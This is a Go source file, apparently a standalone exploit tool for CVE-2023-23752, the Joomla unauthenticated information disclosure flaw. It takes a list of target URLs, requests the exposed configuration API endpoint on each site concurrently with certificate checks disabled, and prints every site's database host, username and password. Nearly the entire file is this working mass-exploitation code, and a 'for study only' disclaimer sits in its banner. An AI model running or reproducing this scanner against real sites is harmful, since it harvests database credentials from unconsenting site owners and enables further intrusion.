package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/charmbracelet/log"
	"github.com/go-resty/resty/v2"
	"os"
	"regexp"
	"sync"
	"time"
)

type Config struct {
	Dbtype   string
	Host     string
	User     string
	Password string
	Dbprefix string
}

type ConfigResult struct {
	url    string
	config *Config
	err    error
}

var (
	PROXIES     string
	logger      *log.Logger
	loggerMutex sync.Mutex // 用于保护日志的互斥锁
)

func init() {
	logger = log.NewWithOptions(os.Stderr, log.Options{
		Level:           log.InfoLevel,
		ReportCaller:    false,
		ReportTimestamp: true,
		TimeFormat:      time.DateTime,
		CallerOffset:    1,
	})
}

func banner() {
	fmt.Println(`
	 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗       ██████╗ ██████╗ ███████╗███████╗██████╗ 
	██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ╚════██╗╚════██╗╚════██║██╔════╝╚════██╗
	██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗ █████╔╝ █████╔╝    ██╔╝███████╗ █████╔╝
	██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝██╔═══╝  ╚═══██╗   ██╔╝ ╚════██║██╔═══╝ 
	╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝      ███████╗██████╔╝   ██║  ███████║███████╗
	 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝       ╚══════╝╚═════╝    ╚═╝  ╚══════╝╚══════╝

	@Auth: C1ph3rX13
	@Blog: https://c1ph3rx13.github.io
	@Note：CVE-2023-23752 Joomla Unauthenticated Information Disclosure
	@Warn: 代码仅供学习使用，请勿用于其他用途
	`)
}

func httpClient(url string) (string, error) {
	headers := map[string]string{
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
		"Accept":     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	}

	client := resty.New().
		SetHeaders(headers).
		SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true}).
		SetTimeout(10 * time.Second).
		SetRedirectPolicy(resty.FlexibleRedirectPolicy(10))

	if PROXIES != "" {
		client.SetProxy(PROXIES)
	}

	target := fmt.Sprintf("%s/api/index.php/v1/config/application?public=true", url)
	resp, err := client.R().Get(target)
	if err != nil {
		return "", fmt.Errorf("failed to make GET request: %v", err)
	}
	defer resp.RawBody().Close()

	return resp.String(), nil
}

func check() {
	urls, err := readUrl()
	if err != nil {
		logger.Errorf("Failed to read URLs: %v", err)
		return
	}

	// 使用 WaitGroup 等待所有 goroutine 完成
	var wg sync.WaitGroup
	wg.Add(len(urls))

	// 开启一个 goroutine 处理每个 URL 请求
	for _, url := range urls {
		go func(url string) {
			defer wg.Done() // 在 goroutine 完成时通知 WaitGroup
			config, err := getConfig(url)
			if err != nil {
				loggerMutex.Lock()
				defer loggerMutex.Unlock()
				logger.Errorf("Failed to check for %s: %v", url, err)
				return
			}
			logPrint(url, config)
		}(url)
	}

	// 等待所有 goroutine 完成
	wg.Wait()
}

func logPrint(url string, config *Config) {
	loggerMutex.Lock()
	defer loggerMutex.Unlock()

	logger.Warnf("Target: %s", url)
	logger.Infof("Dbtype: %s", config.Dbtype)
	logger.Infof("Host: %s", config.Host)
	logger.Infof("User: %s", config.User)
	logger.Infof("Password: %s", config.Password)
	logger.Infof("Dbprefix: %s \n", config.Dbprefix)
}

func getConfig(url string) (*Config, error) {
	body, err := httpClient(url)
	if err != nil {
		return nil, err
	}

	config, err := parseConfig(body)
	if err != nil {
		return nil, err
	}

	return config, nil
}

func parseConfig(bodyStr string) (*Config, error) {
	re := regexp.MustCompile(`"(\w+)":"(.*?)"`)
	matches := re.FindAllStringSubmatch(bodyStr, -1)

	config := &Config{}
	for _, match := range matches {
		key := match[1]
		value := match[2]

		switch key {
		case "dbtype":
			config.Dbtype = value
		case "host":
			config.Host = value
		case "user":
			config.User = value
		case "password":
			config.Password = value
		case "dbprefix":
			config.Dbprefix = value
		}
	}

	return config, nil
}

func readUrl() ([]string, error) {
	file, err := os.Open("urls.txt")
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var urls []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		urls = append(urls, scanner.Text())
	}

	if err = scanner.Err(); err != nil {
		return nil, err
	}

	return urls, nil
}

func main() {
	banner()

	proxy := flag.String("p", "", "Proxy Url")
	flag.Parse()

	if *proxy != "" {
		PROXIES = *proxy
		logger.Infof("Proxy Set: %v", PROXIES)
	}

	check()
}
